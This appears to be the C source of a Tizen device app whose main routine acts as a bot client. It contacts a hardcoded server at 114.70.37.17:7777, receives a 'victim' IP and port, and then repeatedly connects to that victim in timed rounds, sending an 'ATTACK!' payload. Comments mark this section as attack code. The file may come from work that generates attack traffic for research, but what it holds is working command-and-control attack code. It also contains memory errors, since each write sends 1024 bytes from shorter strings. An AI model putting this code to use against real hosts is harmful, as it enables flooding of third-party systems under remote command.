#include "urp_normal.h"
#include <net_connection.h>
#include <sys/stat.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <net/if.h>
#include "string.h"
#include <glib.h>
#include <glib/gprintf.h>
#include <dlog.h>
#include "string.h"
#include <sys/time.h>
#include <unistd.h>

#define SIZE 1024

connection_h connection = NULL;


int cnt = 0;
typedef struct appdata {
   Evas_Object *win;
   Evas_Object *conform;
   Evas_Object *label;
} appdata_s;

static void
win_delete_request_cb(void *data, Evas_Object *obj, void *event_info)
{
   ui_app_exit();
}

static void
win_back_cb(void *data, Evas_Object *obj, void *event_info)
{
   appdata_s *ad = data;
   /* Let window go to hide state. */
   elm_win_lower(ad->win);
}

static void
create_base_gui(appdata_s *ad)
{
   /* Window */
   /* Create and initialize elm_win.
      elm_win is mandatory to manipulate window. */
   ad->win = elm_win_util_standard_add(PACKAGE, PACKAGE);
   elm_win_autodel_set(ad->win, EINA_TRUE);

   if (elm_win_wm_rotation_supported_get(ad->win)) {
      int rots[4] = { 0, 90, 180, 270 };
      elm_win_wm_rotation_available_rotations_set(ad->win, (const int *)(&rots), 4);
   }

   evas_object_smart_callback_add(ad->win, "delete,request", win_delete_request_cb, NULL);
   eext_object_event_callback_add(ad->win, EEXT_CALLBACK_BACK, win_back_cb, ad);

   /* Conformant */
   /* Create and initialize elm_conformant.
      elm_conformant is mandatory for base gui to have proper size
      when indicator or virtual keypad is visible. */
   ad->conform = elm_conformant_add(ad->win);
   elm_win_indicator_mode_set(ad->win, ELM_WIN_INDICATOR_SHOW);
   elm_win_indicator_opacity_set(ad->win, ELM_WIN_INDICATOR_OPAQUE);
   evas_object_size_hint_weight_set(ad->conform, EVAS_HINT_EXPAND, EVAS_HINT_EXPAND);
   elm_win_resize_object_add(ad->win, ad->conform);
   evas_object_show(ad->conform);

   /* Label */
   /* Create an actual view of the base gui.
      Modify this part to change the view. */
   ad->label = elm_label_add(ad->conform);
   elm_object_text_set(ad->label, "<align=center>Hello Tizen</align>");
   evas_object_size_hint_weight_set(ad->label, EVAS_HINT_EXPAND, EVAS_HINT_EXPAND);
   elm_object_content_set(ad->conform, ad->label);

   /* Show window after base gui is set up */
   evas_object_show(ad->win);
}

static bool
app_create(void *data)
{
   /* Hook to take necessary actions before main event loop starts
      Initialize UI resources and application's data
      If this function returns true, the main loop of application starts
      If this function returns false, the application is terminated */
   appdata_s *ad = data;

   create_base_gui(ad);

   return true;
}

static void
app_control(app_control_h app_control, void *data)
{
   /* Handle the launch request. */
}

static void
app_pause(void *data)
{
   /* Take necessary actions when application becomes invisible. */
}

static void
app_resume(void *data)
{
   /* Take necessary actions when application becomes visible. */
}

static void
app_terminate(void *data)
{
   /* Release all resources. */
}

static void
ui_app_lang_changed(app_event_info_h event_info, void *user_data)
{
   /*APP_EVENT_LANGUAGE_CHANGED*/
   char *locale = NULL;
   system_settings_get_value_string(SYSTEM_SETTINGS_KEY_LOCALE_LANGUAGE, &locale);
   elm_language_set(locale);
   free(locale);
   return;
}

static void
ui_app_orient_changed(app_event_info_h event_info, void *user_data)
{
   /*APP_EVENT_DEVICE_ORIENTATION_CHANGED*/
   return;
}

static void
ui_app_region_changed(app_event_info_h event_info, void *user_data)
{
   /*APP_EVENT_REGION_FORMAT_CHANGED*/
}

static void
ui_app_low_battery(app_event_info_h event_info, void *user_data)
{
   /*APP_EVENT_LOW_BATTERY*/
}

static void
ui_app_low_memory(app_event_info_h event_info, void *user_data)
{
   /*APP_EVENT_LOW_MEMORY*/
}


void toVictim(char *victim_ip, char *victim_port, int num){
   dlog_print(DLOG_DEBUG, LOG_TAG, "[connect function] Connect Success");
   dlog_print(DLOG_DEBUG, LOG_TAG, "victim IP : %s \t victim PORT : %s\n" , victim_ip, victim_port);

    int sockfdV;
    socklen_t victim;
    char buffer[SIZE];
    struct sockaddr_in cli_addr, vict_addr ;
    int n;

    // 여기 아래 부터 추가 211024~ (client 측 요청)
    struct addrinfo hints2;
    struct addrinfo *result2;

    memset(&hints2, 0x00, sizeof(struct addrinfo));

    hints2.ai_family = AF_INET; // PF_UNSPEC에서 AF_INET으로 변경
    hints2.ai_socktype = SOCK_STREAM;
    hints2.ai_protocol = IPPROTO_TCP;


    if (getaddrinfo(victim_ip, victim_port, &hints2, &result2) != 0) {
          dlog_print(DLOG_DEBUG, LOG_TAG, "getaddrinfo() error");
          // PRINT_MSG("getaddrinfo() error");
          return;
    }

       // PRINT_MSG("getaddrinfo() succeeded");

       /* Find the proper address family and create the socket */
       struct addrinfo *rp2;

       for (rp2 = result2; rp2 != NULL; rp2 = rp2->ai_next) {

       // 2-01. socket 생성
        if ((sockfdV = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
            dlog_print(DLOG_DEBUG, LOG_TAG, "socket error");
            // PRINT_MSG("socket error");
            freeaddrinfo(result2);
            return;
       }

        dlog_print(DLOG_DEBUG, LOG_TAG, "[2] socket() ok ");


         // 2-02. socket 설정  (+추가)
          int option2 = 1;
          if (setsockopt(sockfdV, SOL_SOCKET, SO_REUSEADDR, (char *)&option2, sizeof(option2)) < 0) {
             dlog_print(DLOG_ERROR, LOG_TAG, "setsockopt() failed = %s", strerror(errno));
             //PRINT_MSG("setsockopt() failed = %s", strerror(errno));
         }
         dlog_print(DLOG_DEBUG, LOG_TAG, "[2] setsockopt() ok ");


            /* Connect to the remote host */
            if (connect(sockfdV, rp2->ai_addr, rp2->ai_addrlen) < 0) {
              dlog_print(DLOG_DEBUG, LOG_TAG, "[2] connect() error: %s", strerror(errno));
              // PRINT_MSG("connect() error: %s", strerror(errno));
              freeaddrinfo(result2);
              close(sockfdV);
              return;
            }

            dlog_print(DLOG_DEBUG, LOG_TAG, "[2] Case 3 Connect() ok ");

       }

       int count2 = 0;

       char *attack_msg = "ATTACK!ATTACK!ATTACK!";
       if ((count2 = write(sockfdV, attack_msg, SIZE)) < 0) {
             dlog_print(DLOG_DEBUG, LOG_TAG, "write() error: %s", strerror(errno));
             freeaddrinfo(result2);
             close(sockfdV);
          }
       dlog_print(DLOG_DEBUG, LOG_TAG, "[2] write OK : %d", num);
       close(sockfdV);
}


int main(int argc, char *argv[])
{
    int rv = 0;

    /* Initialize a socket */
    int ip_type = -1;
    char *user_url = "114.70.37.17";  // Server의 ip 주소
    char *user_port = "7777";
    char *user_msg = "Hello Server. This is Tizen Client.";
    char *local_ipv4 = NULL;
    char *local_ipv6 = NULL;
    char *interface_name = NULL;


    connection_type_e net_state;
    connection_profile_h profile_h = NULL;

    // + connection 연결 확인
    int error_code;
        error_code = connection_create(&connection);
        if (error_code != CONNECTION_ERROR_NONE)
            return -1;



    // Check whether the default connection is available
    rv = connection_get_type(connection, &net_state);

    if (rv != CONNECTION_ERROR_NONE) {
        dlog_print(DLOG_DEBUG, LOG_TAG, "Failed to get connection type %d", rv);
        //// PRINT_MSG("Failed to get connection type %d", rv);
        return -1;
    }

    if (net_state == CONNECTION_TYPE_DISCONNECTED) {
        // PRINT_MSG("Turn on Wi-Fi");
        return -1;
    }

    // Check the address type of the default connection
    rv = connection_get_current_profile(connection, &profile_h);

    if (rv != CONNECTION_ERROR_NONE) {
        dlog_print(DLOG_DEBUG, LOG_TAG, "Failed to get profile handle %d", rv);
        //PRINT_MSG("Failed to get profile handle %d", rv);
        return -1;
    }

    rv = connection_profile_get_ip_address(profile_h, CONNECTION_ADDRESS_FAMILY_IPV6, &local_ipv6);

    if (rv == CONNECTION_ERROR_NONE && g_strcmp0(local_ipv6, "::") != 0) {
        ip_type = CONNECTION_ADDRESS_FAMILY_IPV6;
        dlog_print(DLOG_DEBUG, LOG_TAG, "[default connection] IPv6 address : %s", local_ipv6);
        // PRINT_MSG("IPv6 address : %s", local_ipv6);
    }

    // If both IPv4 and IPv6 types are set, the IPv4 type is used as default here
    rv = connection_profile_get_ip_address(profile_h, CONNECTION_ADDRESS_FAMILY_IPV4, &local_ipv4);

    if (rv == CONNECTION_ERROR_NONE && g_strcmp0(local_ipv4, "0.0.0.0") != 0) {
        ip_type = CONNECTION_ADDRESS_FAMILY_IPV4;
        dlog_print(DLOG_DEBUG, LOG_TAG, "[default connection] IPv4 address : %s", local_ipv4);
        // PRINT_MSG("IPv4 address : %s", local_ipv4);
    }

    if (ip_type != CONNECTION_ADDRESS_FAMILY_IPV6 && ip_type != CONNECTION_ADDRESS_FAMILY_IPV4) {
        dlog_print(DLOG_DEBUG, LOG_TAG, "[default connection] No IP address");
        // PRINT_MSG("No IP address");
    }

    connection_profile_get_network_interface_name(profile_h, &interface_name);
    dlog_print(DLOG_DEBUG, LOG_TAG, "[default connection] Interface Name: %s", interface_name);
    // PRINT_MSG("Interface Name: %s", interface_name);




    /* Retrieving the Address Family */
    struct sockaddr_in6 *addr6;
    struct addrinfo hints;
    struct addrinfo *result;

    memset(&hints, 0x00, sizeof(struct addrinfo));

    hints.ai_family = AF_INET; // PF_UNSPEC에서 AF_INET으로 변경
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    if (getaddrinfo(user_url, user_port, &hints, &result) != 0) {
        dlog_print(DLOG_DEBUG, LOG_TAG, "getaddrinfo() error");
        // PRINT_MSG("getaddrinfo() error");
        return -1;
    }

    // PRINT_MSG("getaddrinfo() succeeded");

    /* Find the proper address family and create the socket */
    int sockfd = -1;
    struct addrinfo *rp;

    for (rp = result; rp != NULL; rp = rp->ai_next) {

        // case 1 : IPv4
        if (rp->ai_family == AF_INET && ip_type == CONNECTION_ADDRESS_FAMILY_IPV4) {
            // 1-01. socket 생성
            if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
                dlog_print(DLOG_DEBUG, LOG_TAG, "socket error");
                // PRINT_MSG("socket error");
                freeaddrinfo(result);
                return -1;
            }

            // 1-02. socket 설정  (+추가)
            int option = 1;
                    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, (char *)&option, sizeof(option)) < 0) {
                        dlog_print(DLOG_ERROR, LOG_TAG, "setsockopt() failed = %s", strerror(errno));
                        //PRINT_MSG("setsockopt() failed = %s", strerror(errno));
                    }



            // 1-03. connect ()
            /* Connect to the remote host */
            if (connect(sockfd, rp->ai_addr, rp->ai_addrlen) < 0) {
                dlog_print(DLOG_DEBUG, LOG_TAG, "ai_addr: %s", rp->ai_addr);
                dlog_print(DLOG_DEBUG, LOG_TAG, "connect() error: %s", strerror(errno));
                // PRINT_MSG("connect() error: %s", strerror(errno));
                freeaddrinfo(result);
                close(sockfd);
                return -1;
            }


            dlog_print(DLOG_DEBUG, LOG_TAG, "Case 1 : IPv4");
            //dlog_print(DLOG_DEBUG, LOG_TAG, "[Case 1] IPv4 address : %s", rp->ai_addr);

            // case 2 : IPv6
        } else if (rp->ai_family == AF_INET6 && ip_type == CONNECTION_ADDRESS_FAMILY_IPV6) {
            if ((sockfd = socket(AF_INET6, SOCK_STREAM, 0)) < 0) {
                dlog_print(DLOG_DEBUG, LOG_TAG, "socket error");

                freeaddrinfo(result);
                return -1;
            }

            dlog_print(DLOG_DEBUG, LOG_TAG, "IPv6");


            //connection_profile_get_network_interface_name(profile_h, &interface_name);
            //dlog_print(DLOG_DEBUG, LOG_TAG, "Interface Name: %s", interface_name);


            addr6 = (struct sockaddr_in6 *)rp->ai_addr;
            addr6->sin6_scope_id = if_nametoindex(interface_name);

            if ((sockfd = connect(sockfd, (struct sockaddr *)addr6, rp->ai_addrlen)) < 0) {
                dlog_print(DLOG_DEBUG, LOG_TAG, "connect() error: %s", strerror(errno));
                freeaddrinfo(result);
                close(sockfd);
                return -1;
            }

            dlog_print(DLOG_DEBUG, LOG_TAG, "Case 2 : IPv6");

        } else {
            if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
                dlog_print(DLOG_DEBUG, LOG_TAG, "socket error");
                // PRINT_MSG("socket error");
                freeaddrinfo(result);
                return -1;
            }

            /* Connect to the remote host */
            if (connect(sockfd, rp->ai_addr, rp->ai_addrlen) < 0) {
                dlog_print(DLOG_DEBUG, LOG_TAG, "connect() error: %s", strerror(errno));
                // PRINT_MSG("connect() error: %s", strerror(errno));
                freeaddrinfo(result);
                close(sockfd);
                return -1;
            }

            dlog_print(DLOG_DEBUG, LOG_TAG, "Case 3 ");
        }
    }

    /*
    * Manage messages
    * Send a message to the remote host
    */
    int count = 0;
    char buf[SIZE];
    memset(buf, 0x00, SIZE);

    if ((count = write(sockfd, user_msg, SIZE)) < 0) {
        dlog_print(DLOG_DEBUG, LOG_TAG, "write() error: %s", strerror(errno));
        freeaddrinfo(result);
        close(sockfd);
    }
    dlog_print(DLOG_DEBUG, LOG_TAG, "[1]write OK");

    /* Read a message from the remote host */
    memset(buf, 0x00, SIZE);

    if ((count = read(sockfd, buf, SIZE)) < 0) {
        dlog_print(DLOG_DEBUG, LOG_TAG, "read() error: %s", strerror(errno));
        freeaddrinfo(result);
        close(sockfd);
    }

    buf[count] = '\0';
    dlog_print(DLOG_DEBUG, LOG_TAG, "[1]Server: count: %d, message: %s", count, buf);
    // PRINT_MSG("Read count: %d, message: %s", count, buf);



    // 여기서 부터 공격 코드 1. ip와 port 구분
    freeaddrinfo(result);
    close(sockfd);
    connection_profile_destroy(profile_h);
    connection_destroy(connection);


    // get victim info
    if (count == 0 ){
    dlog_print(DLOG_DEBUG, LOG_TAG, "get victim info failed");
    return -1;
    }

    char *victim_port = NULL;
    char *victim_ip = strtok_r(buf,":",&victim_port);


    dlog_print(DLOG_DEBUG, LOG_TAG, "victim IP : %s \t victim PORT : %s\n" , victim_ip, victim_port);


    // + connection 연결 확인
    error_code = connection_create(&connection);
    if (error_code != CONNECTION_ERROR_NONE)
        return -1;



    // Check whether the default connection is available
    int rv2 = 0;
    rv2 = connection_get_type(connection, &net_state);

    if (rv2 != CONNECTION_ERROR_NONE) {
        dlog_print(DLOG_DEBUG, LOG_TAG, "Failed to get connection type %d", rv2);
        //// PRINT_MSG("Failed to get connection type %d", rv);
        return -1;
    }

    if (net_state == CONNECTION_TYPE_DISCONNECTED) {
        // PRINT_MSG("Turn on Wi-Fi");
        return -1;
    }

    // Check the address type of the default connection
    rv2 = connection_get_current_profile(connection, &profile_h);

    if (rv2 != CONNECTION_ERROR_NONE) {
        dlog_print(DLOG_DEBUG, LOG_TAG, "Failed to get profile handle %d", rv2);
        //PRINT_MSG("Failed to get profile handle %d", rv);
        return -1;
    }

    rv2 = connection_profile_get_ip_address(profile_h, CONNECTION_ADDRESS_FAMILY_IPV6, &local_ipv6);

    if (rv2 == CONNECTION_ERROR_NONE && g_strcmp0(local_ipv6, "::") != 0) {
        ip_type = CONNECTION_ADDRESS_FAMILY_IPV6;
        dlog_print(DLOG_DEBUG, LOG_TAG, "[default connection] IPv6 address : %s", local_ipv6);
        // PRINT_MSG("IPv6 address : %s", local_ipv6);
    }

    // If both IPv4 and IPv6 types are set, the IPv4 type is used as default here
    rv2 = connection_profile_get_ip_address(profile_h, CONNECTION_ADDRESS_FAMILY_IPV4, &local_ipv4);

    if (rv2 == CONNECTION_ERROR_NONE && g_strcmp0(local_ipv4, "0.0.0.0") != 0) {
        ip_type = CONNECTION_ADDRESS_FAMILY_IPV4;
        dlog_print(DLOG_DEBUG, LOG_TAG, "[default connection] IPv4 address : %s", local_ipv4);
        // PRINT_MSG("IPv4 address : %s", local_ipv4);
    }

    if (ip_type != CONNECTION_ADDRESS_FAMILY_IPV6 && ip_type != CONNECTION_ADDRESS_FAMILY_IPV4) {
        dlog_print(DLOG_DEBUG, LOG_TAG, "[default connection] No IP address");
        // PRINT_MSG("No IP address");
    }

    connection_profile_get_network_interface_name(profile_h, &interface_name);
    dlog_print(DLOG_DEBUG, LOG_TAG, "[default connection] Interface Name: %s", interface_name);
    // PRINT_MSG("Interface Name: %s", interface_name);



    // [2] SEND ATTACK TO VICTIM
    int runtime[5] = {600, 600, 600, 600, 1200};
    int normal_round_sec[5] = {1, 60, 1, 60, 1};
    int normal_packet_num[5] = {30, 2, 20, 2, 30};
    struct timeval  tv, round_tv;
    double begin, end;
    double round_begin, round_end;
    int num;

    for (int i = 0; i < 5; i++){
        dlog_print(DLOG_DEBUG, LOG_TAG, "|---------[ Send Start %d : %d ]------|", (i + 1), cnt);
        gettimeofday(&tv, NULL);
        begin = (tv.tv_sec) * 1000 + (tv.tv_usec) / 1000 ;
        num = 1;

        while(1){
            gettimeofday(&tv, NULL);
            end = (tv.tv_sec) * 1000 + (tv.tv_usec) / 1000 ;
            if(((end - begin) / 1000) >= runtime[i]){
                break;
            }

            gettimeofday(&round_tv, NULL);
            round_begin = (round_tv.tv_sec) * 1000 + (round_tv.tv_usec) / 1000 ;
            for (int p = 0; p < normal_packet_num[i]; p++){
                gettimeofday(&tv, NULL);
                end = (tv.tv_sec) * 1000 + (tv.tv_usec) / 1000 ;
                if(((end - begin) / 1000) >= runtime[i]){
                    break;
                }

                dlog_print(DLOG_DEBUG, LOG_TAG, "[default connection] send to victim");
                toVictim(victim_ip, victim_port, num);
                cnt+=1;
                dlog_print(DLOG_DEBUG, LOG_TAG, "|---------[ Send Cnt %d ]------|", cnt);
                num++;
            }

            while(1){
                gettimeofday(&round_tv, NULL);
                round_end = (round_tv.tv_sec) * 1000 + (round_tv.tv_usec) / 1000 ;
                if(((round_end - round_begin) / 1000) >= normal_round_sec[i]){
                    break;
                }
            }
        }


//				while(1){
//					gettimeofday(&tv, NULL);
//				    end = (tv.tv_sec) * 1000 + (tv.tv_usec) / 1000 ;
//
//					if(((end - begin) / 1000) >= runtime[i]){
//					   break;
//					}
//
//					dlog_print(DLOG_DEBUG, LOG_TAG, "[default connection] send to victim");
//					toVictim(victim_ip, victim_port, num);
//					cnt+=1;
//					dlog_print(DLOG_DEBUG, LOG_TAG, "|---------[ Send Cnt %d ]------|", cnt);
//					num++;
//
//					usleep(normal_delay_sec[i]);
//				}
        }


    dlog_print(DLOG_DEBUG, LOG_TAG, "|---------[ Send Complete ]------|");

    free(local_ipv6);
    free(local_ipv4);
    free(interface_name);
}
